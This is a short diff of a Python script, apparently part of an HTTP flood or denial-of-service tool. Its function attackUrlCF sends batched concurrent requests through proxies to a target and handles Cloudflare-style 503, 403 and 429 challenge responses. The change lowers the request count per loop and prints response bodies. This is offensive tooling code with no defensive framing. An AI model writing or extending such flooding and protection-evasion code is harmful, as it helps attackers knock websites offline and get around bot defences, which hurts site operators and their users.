@@ -114,11 +114,11 @@ def attackUrlCF(baseUrl):
 			# checkIp()
 
 			requestsArr = []
-			for x in range(10):
+			for x in range(1):
 				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
-			print(baseUrl , res)
+			print(baseUrl , res[0].content)
 			# print(res[0].content)
 			if str(res[0].status_code) in ['503', '403', '429']:
 				print('resolsing chalennge')
